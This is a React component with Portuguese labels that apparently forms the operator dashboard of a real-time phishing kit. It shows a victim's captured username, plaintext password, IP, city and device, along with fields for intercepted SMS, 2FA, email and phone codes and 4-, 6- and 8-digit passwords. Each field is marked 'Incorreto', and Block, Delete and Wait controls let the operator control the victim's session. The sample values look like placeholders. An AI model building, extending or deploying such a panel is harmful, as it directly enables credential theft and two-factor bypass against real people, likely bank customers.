
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Shield, Trash2, Clock, Monitor, Globe, User, Lock, MapPin } from "lucide-react";
import { useState, useEffect } from "react";

interface CountryData {
  name: { common: string };
  flags: { svg: string };
}

export const UserDetails = () => {
  const [countryData, setCountryData] = useState<CountryData | null>(null);

  useEffect(() => {
    // Fetch Brazil flag data
    fetch('https://restcountries.com/v3.1/alpha/BR')
      .then(response => response.json())
      .then(data => setCountryData(data[0]))
      .catch(error => console.error('Error fetching country data:', error));
  }, []);

  return (
    <Card className="bg-gray-800/50 backdrop-blur-lg border-gray-700 hover:border-blue-500/50 transition-all duration-500 hover:shadow-2xl hover:shadow-blue-500/25 hover:-translate-y-1 w-full max-w-sm animate-fade-in">
      <CardContent className="p-4">
        {/* Header - Username e Status */}
        <div className="flex items-center justify-between mb-4">
          <h3 className="text-white font-bold text-base">carlos74</h3>
          <div className="flex items-center space-x-2">
            <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
            <span className="text-green-400 text-sm font-medium">Online</span>
          </div>
        </div>

        {/* Grid Principal - Informações */}
        <div className="grid grid-cols-2 gap-3 mb-4">
          <div className="bg-gray-700/50 rounded-lg p-3 hover:bg-gray-700/70 transition-colors">
            <div className="flex items-center space-x-2 mb-2">
              <User className="h-3 w-3 text-blue-400" />
              <span className="text-gray-300 text-xs font-medium">Usuário</span>
            </div>
            <span className="text-white text-sm">carlos74</span>
          </div>

          <div className="bg-gray-700/50 rounded-lg p-3 hover:bg-gray-700/70 transition-colors">
            <div className="flex items-center space-x-2 mb-2">
              <Lock className="h-3 w-3 text-purple-400" />
              <span className="text-gray-300 text-xs font-medium">Senha</span>
            </div>
            <span className="text-white text-sm">pass123!</span>
          </div>

          <div className="bg-gray-700/50 rounded-lg p-3 hover:bg-gray-700/70 transition-colors">
            <div className="flex items-center space-x-2 mb-2">
              <Globe className="h-3 w-3 text-cyan-400" />
              <span className="text-gray-300 text-xs font-medium">IP</span>
            </div>
            <span className="text-white text-sm">192.168.1.104</span>
          </div>

          <div className="bg-gray-700/50 rounded-lg p-3 hover:bg-gray-700/70 transition-colors">
            <div className="flex items-center space-x-2 mb-2">
              {countryData && (
                <img 
                  src={countryData.flags.svg} 
                  alt="Brazil flag" 
                  className="h-3 w-4 object-cover rounded-sm"
                />
              )}
              <span className="text-gray-300 text-xs font-medium">País</span>
            </div>
            <span className="text-white text-sm">Brasil</span>
          </div>

          <div className="bg-gray-700/50 rounded-lg p-3 hover:bg-gray-700/70 transition-colors">
            <div className="flex items-center space-x-2 mb-2">
              <MapPin className="h-3 w-3 text-green-400" />
              <span className="text-gray-300 text-xs font-medium">Cidade</span>
            </div>
            <span className="text-white text-sm">São Paulo</span>
          </div>

          <div className="bg-gray-700/50 rounded-lg p-3 hover:bg-gray-700/70 transition-colors">
            <div className="flex items-center space-x-2 mb-2">
              <Monitor className="h-3 w-3 text-orange-400" />
              <span className="text-gray-300 text-xs font-medium">Dispositivo</span>
            </div>
            <span className="text-white text-sm">iPhone</span>
          </div>
        </div>

        {/* Grid Respostas */}
        <div className="mb-4">
          <h4 className="text-white text-sm font-medium mb-3">Respostas</h4>
          <div className="grid grid-cols-3 gap-2 mb-3">
            {['SMS', 'AUTH', '2FA', 'EMAIL', 'TEL'].slice(0, 3).map((item, index) => (
              <div key={index} className="bg-gray-600/50 rounded-lg p-2 hover:bg-gray-600/70 transition-colors">
                <div className="text-xs text-gray-300 mb-1 font-medium">{item}</div>
                <input 
                  type="text" 
                  className="w-full bg-gray-800/70 text-white text-xs p-1.5 rounded border border-gray-600 focus:border-blue-500 transition-colors"
                  placeholder="..."
                />
                <div className="text-xs text-red-400 mt-1 font-medium">Incorreto</div>
              </div>
            ))}
          </div>
          <div className="grid grid-cols-2 gap-2">
            {['EMAIL', 'TEL'].map((item, index) => (
              <div key={index} className="bg-gray-600/50 rounded-lg p-2 hover:bg-gray-600/70 transition-colors">
                <div className="text-xs text-gray-300 mb-1 font-medium">{item}</div>
                <input 
                  type="text" 
                  className="w-full bg-gray-800/70 text-white text-xs p-1.5 rounded border border-gray-600 focus:border-blue-500 transition-colors"
                  placeholder="..."
                />
                <div className="text-xs text-red-400 mt-1 font-medium">Incorreto</div>
              </div>
            ))}
          </div>
        </div>

        {/* Senhas Adicionais Compactas */}
        <div className="mb-4">
          <h5 className="text-white text-sm font-medium mb-2">Senhas</h5>
          <div className="space-y-2">
            {['4', '6', '8'].map((num, index) => (
              <div key={index} className="flex items-center justify-between bg-gray-600/50 rounded-lg p-2 hover:bg-gray-600/70 transition-colors">
                <span className="text-gray-300 text-xs font-medium">SENHA {num}:</span>
                <div className="flex items-center space-x-2">
                  <input 
                    type="text" 
                    className="bg-gray-800/70 text-white text-xs p-1.5 rounded border border-gray-600 focus:border-blue-500 transition-colors w-16"
                    placeholder="****"
                  />
                  <span className="text-red-400 text-xs font-medium">Incorreto</span>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Botões de Ação Modernos */}
        <div className="space-y-2">
          <Button className="w-full bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white h-8 text-xs transition-all duration-300 hover:scale-105" size="sm">
            <Shield className="h-3 w-3 mr-2" />
            Bloquear
          </Button>
          <Button className="w-full bg-gradient-to-r from-red-800 to-red-900 hover:from-red-900 hover:to-red-950 text-white h-8 text-xs transition-all duration-300 hover:scale-105" size="sm">
            <Trash2 className="h-3 w-3 mr-2" />
            Excluir
          </Button>
          <Button className="w-full bg-gradient-to-r from-yellow-600 to-orange-600 hover:from-yellow-700 hover:to-orange-700 text-white h-8 text-xs transition-all duration-300 hover:scale-105" size="sm">
            <Clock className="h-3 w-3 mr-2" />
            Aguardar
          </Button>
        </div>
      </CardContent>
    </Card>
  );
};
